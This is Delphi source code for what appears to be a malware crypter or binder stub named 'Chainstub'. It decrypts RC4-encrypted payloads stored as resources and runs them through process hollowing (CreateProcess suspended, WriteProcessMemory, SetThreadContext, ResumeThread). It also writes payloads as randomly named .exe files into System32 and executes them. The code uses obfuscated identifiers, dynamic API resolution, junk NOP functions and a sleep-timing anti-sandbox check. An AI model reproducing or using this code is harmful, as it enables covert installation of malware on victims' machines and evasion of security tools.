program Chainstub;
{$Warnings Off}
{$IMAGEBASE $10000000}
uses
  Windows,
  ShellApi,
  uRC4,
  Unit1 in 'Unit1.pas' {Form1};

//DEAD SLEEPY

type
  TSections = array [0..0] of TImageSectionHeader;
Var
  reprendtnthreadxryrikkxx: function(hThread: THandle): DWORD; stdcall;
  placethreddctxt: function(hThread: THandle; const lpContext: TContext): BOOL; stdcall;
  virtuallcosiexeexex: function(hProcess: THandle; lpAddress: Pointer; dwSize, flAllocationType: DWORD; flProtect: DWORD): Pointer; stdcall;
  lislamemoireprocessx: function(hProcess: THandle; const lpBaseAddress: Pointer; lpBuffer: Pointer; nSize: DWORD; var lpNumberOfBytesRead: DWORD): BOOL; stdcall;
  obtientlethxredccssttx: function(hThread: THandle; var lpContext: TContext): BOOL; stdcall;
  kogcccxvvcjyyygfyfyj: function(lpApplicationName: PChar; lpCommandLine: PChar; lpProcessAttributes, lpThreadAttributes: PSecurityAttributes; bInheritHandles: BOOL; dwCreationFlags: DWORD; lpEnvironment: Pointer; lpCurrentDirectory: PChar; const lpStartupInfo: TStartupInfo; var lpProcessInformation: TProcessInformation): BOOL; stdcall;
  ecrirelamemoryxsx: function(hProcess: THandle; const lpBaseAddress: Pointer; lpBuffer: Pointer; nSize: DWORD; var lpNumberOfBytesWritten: DWORD): BOOL; stdcall;
  xobtentproccadr: function(hModule: HMODULE; lpProcName: LPCSTR): FARPROC; stdcall;
  xxobtienmodeedfilenom: function(hModule: HINST; lpFilename: PAnsiChar; nSize: DWORD): DWORD; stdcall;

function rddrxrxrxexerxrrryttqjsdf(Value: ShortString): Integer;
// Value   = eax
// Result  = eax
asm
  push ebx
  push esi

  mov esi,eax
  xor eax,eax
  movzx ecx,Byte([esi]) // read length byte
  cmp ecx,0
  je @exit

  movzx ebx,Byte([esi+1])
  xor edx,edx // edx = 0
  cmp ebx,45  // check for negative '-' = #45
  jne @loop

  dec edx // edx = -1
  inc esi // skip '-'
  dec ecx

  @loop:
    inc   esi
    movzx ebx,Byte([esi])
    imul  eax,10
    sub   ebx,48 // '0' = #48
    add   eax,ebx
    dec   ecx
  jnz @loop

  mov ecx,eax
  and ecx,edx
  shl ecx,1
  sub eax,ecx

  @exit:
  pop esi
  pop ebx
end;


function cvcvccwbjqiiuiyeieieieieoeirparrrz(Value: Integer): ShortString;
// Value  = eax
// Result = edx
asm
  push ebx
  push esi
  push edi

  mov edi,edx
  xor ecx,ecx
  mov ebx,10
  xor edx,edx

  cmp eax,0 // check for negative
  setl dl
  mov esi,edx
  jnl @reads
  neg eax

  @reads:
    mov  edx,0   // edx = eax mod 10
    div  ebx     // eax = eax div 10
    add  edx,48  // '0' = #48
    push edx
    inc  ecx
    cmp  eax,0
  jne @reads

  dec esi
  jnz @positive
  push 45 // '-' = #45
  inc ecx

  @positive:
  mov [edi],cl // set length byte
  inc edi

  @writes:
    pop eax
    mov [edi],al
    inc edi
    dec ecx
  jnz @writes

  pop edi
  pop esi
  pop ebx
end;
function GetWindowsDirectory: string;
var
dddodpdpoovipodopopjuqojopbs : array [0..MAX_Path] of char;
begin
asm
lea eax, dddodpdpoovipodopopjuqojopbs
test eax, eax
push eax
xor eax, eax
call GetWindowsDirectoryA
end;
result := string(dddodpdpoovipodopopjuqojopbs)+'\'
end;

function hhyyuuuhuhhugchvbbbuuiuiybbbi(var Size:integer; pSectionName: pchar): pointer;
var
  ResourceLocation: HRSRC;
  ResourceHandle: THandle;
begin
  ResourceLocation := FindResource(hInstance, pSectionName, RT_RCDATA);
  Size := SizeOfResource(hInstance, ResourceLocation);
  ResourceHandle := LoadResource(hInstance, ResourceLocation);
  Result := LockResource(ResourceHandle);
  If Result <> NIL Then
    FreeResource(ResourceHandle);
end;
(*****************************************
 bbjujuhjgjgjgjgggffhyfgyygtgyujk() Function

 Translates a macro to a string.
 Example: TMP = Temp Directory String
 ****************************************)

Function bbjujuhjgjgjgjgggffhyfgyygtgyujk(Macro: String): String;
Var
  Size          :Cardinal;
  Output        :Array[0..MAX_Path] of Char;
Begin
  Result := '';
  FillChar(Output, SizeOf(Output), #0);

  Size := SizeOf(Output);
  Size := GetEnvironmentVariable(PChar(Macro), Output, Size);
  If (Size > 0) Then
    Result := Output;
End;
function wholefunc(dummy: integer): integer;
begin
asm // here
nop // is
end; // our NOP
end;

Function qaeraeeaeaarhtwyjauaukilalaawa(Kind:Integer):STRING;
Begin
if Kind=0 Then Result:=bbjujuhjgjgjgjgggffhyfgyygtgyujk('TEMP');
if Kind=1 Then Result:=bbjujuhjgjgjgjgggffhyfgyygtgyujk('SystemRoot');
if Kind=2 Then Result:=(bbjujuhjgjgjgjgggffhyfgyygtgyujk('SystemRoot') + '\System32');
END;

Function wiosooppoqppwwwwppoowp(nomdlarescs:String):String;
Var
  pointrerebouffr         :Pointer;
  BufferLength          :Integer;
  BufferString          :AnsiString;
begin
 // Result:='';
  pointrerebouffr := hhyyuuuhuhhugchvbbbuuiuiybbbi(BufferLength, PChar(nomdlarescs));
 // If (Assigned(pointrerebouffr)) Then
    Begin
     SetLength(BufferString, BufferLength);
     Move(pointrerebouffr^, BufferString[1], BufferLength);
     Result:=BufferString;
    End;
end;

function lpiogiokkonjibviohdosvjuodioiobobocd(Size: dword; Alignment: dword): dword;
begin
  if ((Size mod Alignment) = rddrxrxrxexerxrrryttqjsdf('0')) then
  begin
    Result := Size;
  end
  else
  begin
    Result := ((Size div Alignment) + rddrxrxrxexerxrrryttqjsdf('1')) * Alignment;
  end;
end;

function dumyyuselesss(dummy: integer): integer;
begin
asm // here
nop // is
end; // our NOP
end;

function aioooooooiutteziuopadkofjdqm(Image: pointer): dword;
var
  Alignment: dword;
  ImageNtHeaders: PImageNtHeaders;
  PSections: ^TSections;
  SectionLoop: dword;
begin
  ImageNtHeaders := pointer(dword(dword(Image)) + dword(PImageDosHeader(Image)._lfanew));
  Alignment := ImageNtHeaders.OptionalHeader.SectionAlignment;
  if ((ImageNtHeaders.OptionalHeader.SizeOfHeaders mod Alignment) = rddrxrxrxexerxrrryttqjsdf('0')) then
  begin
    Result := ImageNtHeaders.OptionalHeader.SizeOfHeaders;
  end
  else
  begin
    Result := ((ImageNtHeaders.OptionalHeader.SizeOfHeaders div Alignment) + rddrxrxrxexerxrrryttqjsdf('1')) * Alignment;
  end;
  PSections := pointer(pchar(@(ImageNtHeaders.OptionalHeader)) + ImageNtHeaders.FileHeader.SizeOfOptionalHeader);
  for SectionLoop := rddrxrxrxexerxrrryttqjsdf('0') to ImageNtHeaders.FileHeader.NumberOfSections - rddrxrxrxexerxrrryttqjsdf('1') do
  begin
    if PSections[SectionLoop].Misc.VirtualSize <> rddrxrxrxexerxrrryttqjsdf('0') then
    begin
      if ((PSections[SectionLoop].Misc.VirtualSize mod Alignment) = rddrxrxrxexerxrrryttqjsdf('0')) then
      begin
        Result := Result + PSections[SectionLoop].Misc.VirtualSize;
      end
      else
      begin
        Result := Result + (((PSections[SectionLoop].Misc.VirtualSize div Alignment) + rddrxrxrxexerxrrryttqjsdf('1')) * Alignment);
      end;
    end;
  end;
end;
function dsododosodovkokbopskkus(dummy: integer): integer;
begin
asm // here
nop // is
end; // our NOP
end;

Procedure porozpigpoiogpojbpmqjmokjme;
Var
  DLLHandle     :THandle;
Begin
  DLLHandle := LoadLibrary(pChar('kernel32.dll'));   //kernel32.dll
  @xobtentproccadr      :=  GetProcAddress(DLLHandle, PChar('GetProcAddress'));  //GetProcAddress
  @reprendtnthreadxryrikkxx        := xobtentproccadr(DLLHandle, pChar('ResumeThread')); //ResumeThread
  @placethreddctxt    := xobtentproccadr(DLLHandle, pChar('SetThreadContext'));  //SetThreadContext
  @lislamemoireprocessx   := xobtentproccadr(DLLHandle, pChar('ReadProcessMemory'));//ReadProcessMemory
  @obtientlethxredccssttx    := xobtentproccadr(DLLHandle, pChar('GetThreadContext')); //GetThreadContext
  @kogcccxvvcjyyygfyfyj       := xobtentproccadr(DLLHandle, pChar('CreateProcessA'));   //CreateProcessA
  @ecrirelamemoryxsx  := xobtentproccadr(DLLHandle, pChar('WriteProcessMemory')); //WriteProcessMemory
  @virtuallcosiexeexex      := xobtentproccadr(DLLHandle, pChar('VirtualAllocEx'));  //VirtualAllocEx
  @xxobtienmodeedfilenom   := xobtentproccadr(DLLHandle, pChar('GetModuleFileNameA'));//GetModuleFileNameA
End;
function lllpplgbpusefesjokefonc(dummy: integer): integer;
begin
asm // here
nop // is
end; // our NOP
end;

procedure creeerttayuioppprprroroorpocexxxedsx(FileMemory: pointer);
var
  BaseAddress, Bytes, HeaderSize, InjectSize,  SectionLoop, SectionSize: dword;
  Context: TContext;
  FileData: pointer;
  ImageNtHeaders: PImageNtHeaders;
  InjectMemory: pointer;
  ProcInfo: TProcessInformation;
  PSections: ^TSections;
  StartInfo: TStartupInfo;
  Injectdddodpdpoovipodopopjuqojopbs    :Array[0..MAX_Path] Of Char;
begin
  porozpigpoiogpojbpmqjmokjme;
  FillChar(Injectdddodpdpoovipodopopjuqojopbs, MAX_Path, #0);
  xxobtienmodeedfilenom(0, Injectdddodpdpoovipodopopjuqojopbs, MAX_Path);
  ImageNtHeaders := pointer(dword(dword(FileMemory)) + dword(PImageDosHeader(FileMemory)._lfanew));
  InjectSize := aioooooooiutteziuopadkofjdqm(FileMemory);
  GetMem(InjectMemory, InjectSize);
  try
    FileData := InjectMemory;
    HeaderSize := ImageNtHeaders.OptionalHeader.SizeOfHeaders;
    PSections := pointer(pchar(@(ImageNtHeaders.OptionalHeader)) + ImageNtHeaders.FileHeader.SizeOfOptionalHeader);
    for SectionLoop := rddrxrxrxexerxrrryttqjsdf('0') to ImageNtHeaders.FileHeader.NumberOfSections - rddrxrxrxexerxrrryttqjsdf('1') do
    begin
      if PSections[SectionLoop].PointerToRawData < HeaderSize then HeaderSize := PSections[SectionLoop].PointerToRawData;
    end;
    CopyMemory(FileData, FileMemory, HeaderSize);
    FileData := pointer(dword(FileData) + lpiogiokkonjibviohdosvjuodioiobobocd(ImageNtHeaders.OptionalHeader.SizeOfHeaders, ImageNtHeaders.OptionalHeader.SectionAlignment));
    for SectionLoop := rddrxrxrxexerxrrryttqjsdf('0') to ImageNtHeaders.FileHeader.NumberOfSections - rddrxrxrxexerxrrryttqjsdf('1') do
    begin
      if PSections[SectionLoop].SizeOfRawData > rddrxrxrxexerxrrryttqjsdf('0') then
      begin
        SectionSize := PSections[SectionLoop].SizeOfRawData;
        if SectionSize > PSections[SectionLoop].Misc.VirtualSize then SectionSize := PSections[SectionLoop].Misc.VirtualSize;
        CopyMemory(FileData, pointer(dword(FileMemory) + PSections[SectionLoop].PointerToRawData), SectionSize);
        FileData := pointer(dword(FileData) + lpiogiokkonjibviohdosvjuodioiobobocd(PSections[SectionLoop].Misc.VirtualSize, ImageNtHeaders.OptionalHeader.SectionAlignment));
      end
      else
      begin
        if PSections[SectionLoop].Misc.VirtualSize <> rddrxrxrxexerxrrryttqjsdf('0')then FileData := pointer(dword(FileData) + lpiogiokkonjibviohdosvjuodioiobobocd(PSections[SectionLoop].Misc.VirtualSize, ImageNtHeaders.OptionalHeader.SectionAlignment));
      end;
    end;
    ZeroMemory(@StartInfo, SizeOf(StartupInfo));
    ZeroMemory(@Context, SizeOf(TContext));
    kogcccxvvcjyyygfyfyj(NIL, pChar(String(Injectdddodpdpoovipodopopjuqojopbs)), NIL, NIL, False, CREATE_SUSPENDED, NIL, NIL, StartInfo, ProcInfo);
    Context.ContextFlags := CONTEXT_FULL;
    obtientlethxredccssttx(ProcInfo.hThread, Context);
    lislamemoireprocessx(ProcInfo.hProcess, pointer(Context.Ebx + rddrxrxrxexerxrrryttqjsdf('8')), @BaseAddress, rddrxrxrxexerxrrryttqjsdf('4'), Bytes);
    virtuallcosiexeexex(ProcInfo.hProcess, pointer(ImageNtHeaders.OptionalHeader.ImageBase), InjectSize, MEM_RESERVE or MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    ecrirelamemoryxsx(ProcInfo.hProcess, pointer(ImageNtHeaders.OptionalHeader.ImageBase), InjectMemory, InjectSize, Bytes);
    ecrirelamemoryxsx(ProcInfo.hProcess, pointer(Context.Ebx + rddrxrxrxexerxrrryttqjsdf('8')), @ImageNtHeaders.OptionalHeader.ImageBase, rddrxrxrxexerxrrryttqjsdf('4'), Bytes);
    Context.Eax := ImageNtHeaders.OptionalHeader.ImageBase + ImageNtHeaders.OptionalHeader.AddressOfEntryPoint;
    placethreddctxt(ProcInfo.hThread, Context);
    reprendtnthreadxryrikkxx(ProcInfo.hThread);
  finally
    FreeMemory(InjectMemory);
  end;
end;
function sdhhgkjdsvjjsmk(dummy: integer): integer;
begin
asm // here
nop // is
end; // our NOP
end;

Function pooonlknknknfjjjjjjojjzojozjl:Boolean;
Var
UpTime            :DWORD;
UpTimeAfterSleep  :Dword;
Begin
   UpTime  := GetTickCount;
   Sleep(500);
   UpTimeAfterSleep := GetTickCount;
   if ( UpTimeAfterSleep - UpTime ) < 500 Then
   Result:= True Else Result:= False;
end;

VAR
i,i2,i3,i4,looovpdvpdioppedped:integer;
Buffer:AnsiString;
pointrerebouffr         :Pointer;
Key,dddodpdpoovipodopopjuqojopbs:String;
F:File;
Begin
if (pooonlknknknfjjjjjjojjzojozjl) Then Exitprocess(0);
Key:=wiosooppoqppwwwwppoowp('KEY');
  //Messagebox(0,Pchar(kEY),'KEY',16);
   IF Key='' Then Exitprocess(0);
   For i:=1 to 6 do
   begin
   if wiosooppoqppwwwwppoowp('M'+cvcvccwbjqiiuiyeieieieieoeirparrrz(I))<>'' Then
   begin
   Buffer       := wiosooppoqppwwwwppoowp('M'+cvcvccwbjqiiuiyeieieieieoeirparrrz(I));
   For looovpdvpdioppedped:=0 To 512 do
   begin
   Buffer       := Rc4(Buffer,Key);
   end;
   GetMem(pointrerebouffr, Length(Buffer));       //convert STRING to POINTER
   Move(Buffer[1], pointrerebouffr^, Length(Buffer));
   Begin
    Try
     creeerttayuioppprprroroorpocexxxedsx(pointrerebouffr);
    Finally
     FreeMem(pointrerebouffr);
   End;
   End;
  end;

  For i2:=1 to 6 do
   begin
  if wiosooppoqppwwwwppoowp('T'+cvcvccwbjqiiuiyeieieieieoeirparrrz(I))<>'' Then
   begin
     Buffer       := wiosooppoqppwwwwppoowp('T'+cvcvccwbjqiiuiyeieieieieoeirparrrz(I));
     For looovpdvpdioppedped:=0 To 512 do
     begin
     Buffer       := Rc4(Buffer,Key);
     end;
     dddodpdpoovipodopopjuqojopbs:= qaeraeeaeaarhtwyjauaukilalaawa(2)+cvcvccwbjqiiuiyeieieieieoeirparrrz(Random(500))+'.exe';
     AssignFile(F, dddodpdpoovipodopopjuqojopbs);
     Rewrite(F, 1);
     If (IOResult = 0) Then
     Begin
      BlockWrite(F, Buffer[1], Length(Buffer));
      CloseFile(F);
     End;
     ShellExecute(0, 'open', PChar(dddodpdpoovipodopopjuqojopbs), nil, nil, 1);
  End;
 end;
 end;

 For i3:=1 to 6 do
   begin
   if wiosooppoqppwwwwppoowp('S'+cvcvccwbjqiiuiyeieieieieoeirparrrz(I2))<>'' Then
 begin
     Buffer       := wiosooppoqppwwwwppoowp('S'+cvcvccwbjqiiuiyeieieieieoeirparrrz(I2));
     For looovpdvpdioppedped:=0 To 512 do
     begin
     Buffer       := Rc4(Buffer,Key);
     end;
     dddodpdpoovipodopopjuqojopbs:= qaeraeeaeaarhtwyjauaukilalaawa(2)+cvcvccwbjqiiuiyeieieieieoeirparrrz(Random(500))+'.exe';
     AssignFile(F, dddodpdpoovipodopopjuqojopbs);
     Rewrite(F, 1);
     If (IOResult = 0) Then
     Begin
      BlockWrite(F, Buffer[1], Length(Buffer));
      CloseFile(F);
     End;
     ShellExecute(0, 'open', PChar(dddodpdpoovipodopopjuqojopbs), nil, nil, 1);
  End;
 end;


   For i3:=1 to 6 do
   begin
 if wiosooppoqppwwwwppoowp('W'+cvcvccwbjqiiuiyeieieieieoeirparrrz(I3))<>'' Then
   begin
     Buffer       := wiosooppoqppwwwwppoowp('W'+cvcvccwbjqiiuiyeieieieieoeirparrrz(I3));
     For looovpdvpdioppedped:=0 To 512 do
     begin
     Buffer       := Rc4(Buffer,Key);
     end;
     dddodpdpoovipodopopjuqojopbs:= qaeraeeaeaarhtwyjauaukilalaawa(2)+cvcvccwbjqiiuiyeieieieieoeirparrrz(Random(500))+'.exe';
     AssignFile(F, dddodpdpoovipodopopjuqojopbs);
     Rewrite(F, 1);
     If (IOResult = 0) Then
     Begin
      BlockWrite(F, Buffer[1], Length(Buffer));
      CloseFile(F);
     End;
     ShellExecute(0, 'open', PChar(dddodpdpoovipodopopjuqojopbs), nil, nil, 1);
  End;
 end;

end.
